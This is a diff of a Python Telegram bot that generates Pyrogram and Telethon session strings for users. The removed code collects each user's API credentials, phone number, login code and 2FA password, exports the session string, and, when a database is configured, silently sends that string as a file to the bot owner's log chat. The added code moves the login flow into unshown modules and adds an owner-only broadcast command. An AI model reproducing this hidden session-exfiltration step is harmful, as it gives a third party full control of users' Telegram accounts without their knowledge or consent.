@@ -1,24 +1,21 @@
 import os
 import time
 from pyrogram import Client, filters
-from pyrogram.errors import SessionPasswordNeeded
-from telethon.sessions import StringSession
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
 from motor.motor_asyncio import AsyncIOMotorClient
 
-# ---------------- SAFE ENV ---------------- #
+from start import WELCOME_TEXT, start_buttons
+from help import HELP_TEXT, help_buttons
+from pyrogram_module import handle_pyro
+from telethon_module import handle_tele
 
-def get_env(key):
-    value = os.getenv(key)
-    if not value:
-        raise Exception(f"❌ Missing ENV: {key}")
-    return value
+# ---------------- ENV ---------------- #
 
-API_ID = int(get_env("API_ID"))
-API_HASH = get_env("API_HASH")
-BOT_TOKEN = get_env("BOT_TOKEN")
-LOGGER_ID = int(get_env("LOGGER_ID"))
+API_ID = int(os.getenv("API_ID"))
+API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+LOGGER_ID = int(os.getenv("LOGGER_ID"))
+OWNER_ID = int(os.getenv("OWNER_ID"))
+CHANNEL = "hellupdates1"
 
 bot = Client("string_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
@@ -38,136 +35,111 @@ users = {}
 async def send_log(text):
     try:
         await bot.send_message(LOGGER_ID, text)
-    except Exception as e:
-        print("LOGGER ERROR:", e)
+    except:
+        print("Logger failed")
 
 # ---------------- START ---------------- #
 
 @bot.on_message(filters.command("start"))
 async def start(client, message):
 
-    user = message.from_user
+    uid = message.from_user.id
 
-    if users_db is not None:
-        await users_db.update_one(
-            {"user_id": user.id},
-            {"$set": {"user_id": user.id}},
-            upsert=True
+    users[uid] = {"step": "choose", "time": time.time()}
+
+    await send_log(f"🚀 START\nID: {uid}")
+
+    await message.reply(
+        WELCOME_TEXT,
+        reply_markup=start_buttons(CHANNEL)
+    )
+
+# ---------------- CALLBACK ---------------- #
+
+@bot.on_callback_query()
+async def cb(client, cb):
+
+    uid = cb.from_user.id
+
+    # 🔥 PYROGRAM
+    if cb.data == "pyro":
+        users[uid] = {"mode": "pyro", "step": "api_id", "time": time.time()}
+        return await cb.message.edit("🍂 Send API_ID (Pyrogram)")
+
+    # 🔥 TELETHON
+    if cb.data == "tele":
+        users[uid] = {"mode": "tele", "step": "api_id", "time": time.time()}
+        return await cb.message.edit("🍂 Send API_ID (Telethon)")
+
+    # 🔥 HELP MENU
+    if cb.data == "help":
+        return await cb.message.edit(HELP_TEXT, reply_markup=help_buttons())
+
+    # 🔙 BACK BUTTON
+    if cb.data == "back":
+        return await cb.message.edit(
+            WELCOME_TEXT,
+            reply_markup=start_buttons(CHANNEL)
         )
 
-    await send_log(f"""
-🚀 START
-
-👤 {user.first_name}
-🆔 {user.id}
-""")
-
-    await message.reply("Send API_ID")
-
-    users[user.id] = {"time": time.time()}
+    # 🔥 VERIFY (OPTIONAL)
+    if cb.data == "verify":
+        return await cb.answer("Join channel first", show_alert=True)
 
 # ---------------- HANDLER ---------------- #
 
 @bot.on_message(filters.private & filters.text)
 async def handler(client, message):
 
-    user_data = users.get(message.from_user.id)
-    if not user_data:
+    uid = message.from_user.id
+    data = users.get(uid)
+
+    if not data:
         return
 
-    if time.time() - user_data["time"] > 180:
-        users.pop(message.from_user.id)
-        return await message.reply("⌛ Timeout")
+    if data["mode"] == "pyro":
+        await handle_pyro(client, message, data, users, send_log, bot)
 
-    try:
+    elif data["mode"] == "tele":
+        await handle_tele(client, message, data, users, send_log, bot)
 
-        # API ID
-        if "api_id" not in user_data:
-            user_data["api_id"] = int(message.text)
-            return await message.reply("Send API_HASH")
+# ---------------- BROADCAST ---------------- #
 
-        # API HASH
-        elif "api_hash" not in user_data:
-            user_data["api_hash"] = message.text
-            return await message.reply("Send Phone (+91...)")
+@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
+async def broadcast(client, message):
 
-        # PHONE
-        elif "phone" not in user_data:
-            user_data["phone"] = message.text
+    if not users_db:
+        return await message.reply("DB not connected")
 
-            app = Client(
-                "temp",
-                api_id=user_data["api_id"],
-                api_hash=user_data["api_hash"]
-            )
+    success = failed = 0
 
-            await app.connect()
-            code = await app.send_code(user_data["phone"])
+    if message.reply_to_message:
+        msg = message.reply_to_message
 
-            user_data["app"] = app
-            user_data["hash"] = code.phone_code_hash
-
-            return await message.reply("Send OTP")
-
-        # OTP
-        elif "otp" not in user_data:
-
-            user_data["otp"] = message.text
-
+        async for u in users_db.find():
             try:
-                await user_data["app"].sign_in(
-                    user_data["phone"],
-                    user_data["hash"],
-                    user_data["otp"]
-                )
+                await msg.copy(u["user_id"])
+                success += 1
+            except:
+                failed += 1
 
-            except SessionPasswordNeeded:
-                user_data["need_pass"] = True
-                return await message.reply("🔐 Send 2FA Password")
+    elif len(message.command) > 1:
+        text = message.text.split(None, 1)[1]
 
-            string = await user_data["app"].export_session_string()
-            await user_data["app"].disconnect()
-
-            await message.reply(f"✅ STRING:\n\n`{string}`")
-
-            await send_log(f"🆕 SESSION GENERATED\nID: {message.from_user.id}")
-
-            if users_db:
-                await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name="session.txt")
-
-            users.pop(message.from_user.id)
-            return
-
-        # PASSWORD (2FA)
-        elif user_data.get("need_pass"):
-
+        async for u in users_db.find():
             try:
-                client_t = user_data["app"]
+                await bot.send_message(u["user_id"], text)
+                success += 1
+            except:
+                failed += 1
 
-                if not client_t.is_connected():
-                    await client_t.connect()
+    else:
+        return await message.reply("Reply or send text")
 
-                await client_t.check_password(message.text)
+    await send_log(f"📢 BROADCAST\n✅ {success} ❌ {failed}")
 
-                string = await client_t.export_session_string()
-                await client_t.disconnect()
-
-                await message.reply(f"🔐 2FA STRING:\n\n`{string}`")
-
-                await send_log(f"🔐 2FA SESSION\nID: {message.from_user.id}")
-
-            except Exception as e:
-                return await message.reply(f"❌ Wrong Password: {e}")
-
-            users.pop(message.from_user.id)
-            return
-
-    except Exception as e:
-        await message.reply(f"❌ Error: {e}")
-        users.pop(message.from_user.id, None)
+    await message.reply(f"Done\nSuccess: {success}\nFailed: {failed}")
 
 # ---------------- RUN ---------------- #
 
-if __name__ == "__main__":
-    print("🚀 Bot Started Successfully")
-    bot.run()
+bot.run()
